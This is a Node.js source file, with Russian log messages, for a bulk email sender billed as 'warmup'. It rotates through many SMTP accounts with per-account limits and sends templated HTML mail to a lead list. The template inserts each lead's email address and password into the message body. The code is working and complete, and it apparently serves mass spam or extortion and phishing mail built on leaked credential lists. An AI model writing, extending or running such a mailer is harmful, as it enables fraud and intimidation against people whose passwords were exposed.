'use strict';

const fs = require('fs');
const path = require('path');
const mailService = require('./mailService');

let DATA_DIR = path.join(__dirname, '..', '..', 'data');

function init(opts) {
  if (opts && opts.dataDir) DATA_DIR = opts.dataDir;
}

function warmupEmailFile() {
  return path.join(DATA_DIR, 'warmup-email.json');
}

function warmupSmtpStatsFile() {
  return path.join(DATA_DIR, 'warmup-smtp-stats.json');
}

function readWarmupEmailConfig() {
  try {
    const f = warmupEmailFile();
    if (fs.existsSync(f)) {
      const raw = fs.readFileSync(f, 'utf8');
      const data = JSON.parse(raw);
      if (data.configs && Array.isArray(data.configs)) {
        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
        return { currentId, configs: data.configs, current };
      }
    }
  } catch (e) {}
  const emptyId = 'default';
  return { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' } };
}

function writeWarmupEmailConfig(data) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
    fs.writeFileSync(warmupEmailFile(), JSON.stringify(toWrite || {}, null, 2), 'utf8');
  } catch (e) {}
}

function readWarmupSmtpStats() {
  try {
    const f = warmupSmtpStatsFile();
    if (fs.existsSync(f)) {
      const raw = fs.readFileSync(f, 'utf8');
      const data = JSON.parse(raw);
      if (data && typeof data === 'object') return data;
    }
  } catch (e) {}
  return {};
}

function writeWarmupSmtpStats(stats) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(warmupSmtpStatsFile(), JSON.stringify(stats || {}, null, 2), 'utf8');
  } catch (e) {}
}

const WARMUP_LOG_MAX = 500;

const warmupState = {
  running: false,
  stopped: false,
  paused: false,
  configs: [],
  flatList: [],
  leads: [],
  perSmtpLimit: 0,
  delayMs: 2000,
  numThreads: 1,
  sentPerSmtp: {},
  log: [],
  totalSent: 0
};

function runWarmupStep() {
  const nodemailer = mailService.getNodemailer();
  if (warmupState.stopped || !warmupState.running) {
    warmupState.running = false;
    warmupState.log.push({ text: '[Прогрев остановлен]', type: 'muted' });
    return;
  }
  if (warmupState.paused) {
    setTimeout(runWarmupStep, 500);
    return;
  }
  const flatList = warmupState.flatList;
  const leads = warmupState.leads;
  const limit = warmupState.perSmtpLimit;
  const sentPerSmtp = warmupState.sentPerSmtp;
  if (!flatList.length || !leads.length) {
    warmupState.running = false;
    warmupState.log.push({ text: '[Прогрев завершён: нет SMTP или лидов]', type: 'muted' });
    return;
  }
  const s = warmupState.totalSent;
  let chosen = null;
  for (let k = 0; k < flatList.length; k++) {
    const idx = (s + k) % flatList.length;
    const entry = flatList[idx];
    if ((sentPerSmtp[entry.smtp.fromEmail] || 0) < limit) {
      chosen = entry;
      break;
    }
  }
  if (!chosen) {
    warmupState.running = false;
    warmupState.log.push({ text: '[Прогрев завершён: лимит по каждому SMTP достигнут]', type: 'muted' });
    return;
  }
  const cfg = chosen.config;
  const smtp = chosen.smtp;
  warmupState.totalSent++;
  warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 0) + 1;
  const leadIndex = s % leads.length;
  const lead = leads[leadIndex];
  const toEmail = (lead.email || '').trim();
  if (!toEmail) {
    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
    setTimeout(runWarmupStep, 100);
    return;
  }
  const password = (lead.password || '').trim();
  let html = (cfg.html || '').replace(/_email_/g, toEmail).replace(/_password_/g, password);
  const attachments = [];
  if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
    try {
      const buf = Buffer.from(cfg.image1Base64, 'base64');
      html = html.replace(/_src1_/g, 'cid:image1@mail');
      attachments.push({ filename: 'image1.png', content: buf, cid: 'image1@mail' });
    } catch (e) {}
  } else if (html.indexOf('_src1_') !== -1) {
    html = html.replace(/_src1_/g, '');
  }
  if (!nodemailer) {
    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
    warmupState.totalSent--;
    warmupState.log.push({ text: '[nodemailer не установлен]', type: 'error' });
    warmupState.running = false;
    return;
  }
  const transporter = nodemailer.createTransport({
    host: smtp.host,
    port: smtp.port,
    secure: smtp.port === 465,
    auth: { user: smtp.user, pass: smtp.password }
  });
  const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
  const mailOptions = {
    from: fromStr,
    to: toEmail,
    subject: (cfg.title || '').trim() || 'Message',
    html,
    attachments: attachments.length ? attachments : undefined,
    envelope: { from: smtp.fromEmail, to: toEmail }
  };
  transporter.sendMail(mailOptions).then(() => {
    writeWarmupSmtpStats(warmupState.sentPerSmtp);
    warmupState.log.push({ text: 'Отправлено с ' + smtp.fromEmail + ' на ' + toEmail, type: 'success' });
    if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
    setTimeout(runWarmupStep, warmupState.delayMs);
  }).catch((err) => {
    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
    const msg = (err.message || String(err)).slice(0, 150);
    warmupState.log.push({ text: '[Ошибка ' + smtp.fromEmail + ' → ' + toEmail + ': ' + msg + ']', type: 'error' });
    if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
    setTimeout(runWarmupStep, Math.min(warmupState.delayMs, 5000));
  });
}

module.exports = {
  init,
  WARMUP_LOG_MAX,
  warmupState,
  runWarmupStep,
  readWarmupEmailConfig,
  writeWarmupEmailConfig,
  readWarmupSmtpStats,
  writeWarmupSmtpStats,
  warmupEmailFile,
  warmupSmtpStatsFile,
};
